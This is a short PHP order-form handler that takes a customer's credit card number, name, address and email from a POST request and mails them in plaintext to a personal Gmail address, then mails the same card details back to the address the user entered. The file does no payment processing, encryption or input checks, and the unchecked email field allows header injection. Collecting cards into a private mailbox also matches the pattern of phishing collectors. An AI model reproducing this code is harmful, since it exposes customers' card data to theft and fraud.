<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $to = "jersey.daniel.berjamin@gmail.com";
    $subject = "New Order";
    $message = "Credit Card Number: " . $_POST["credit-card"] . "\n";
    $message .= "Name: " . $_POST["name"] . "\n";
    $message .= "Address: " . $_POST["address"] . "\n";
    $message .= "Email: " . $_POST["email"] . "\n";


    $headers = "From: yourwebsite@example.com" . "\r\n" .
               "Reply-To: yourwebsite@example.com" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    
    mail($to, $subject, $message, $headers);


    $customerEmail = $_POST["email"];
    $customerSubject = "Order Confirmation";
    $customerMessage = "Thank you for your order!\n\n";
    $customerMessage .= "Here are the details of your order:\n";
    $customerMessage .= $message;

   
    $customerHeaders = "From: yourwebsite@example.com" . "\r\n" .
                       "Reply-To: yourwebsite@example.com" . "\r\n" .
                       "X-Mailer: PHP/" . phpversion();

  
    mail($customerEmail, $customerSubject, $customerMessage, $customerHeaders);

    echo "Order placed successfully! A confirmation email has been sent to your provided email address.";
}
?>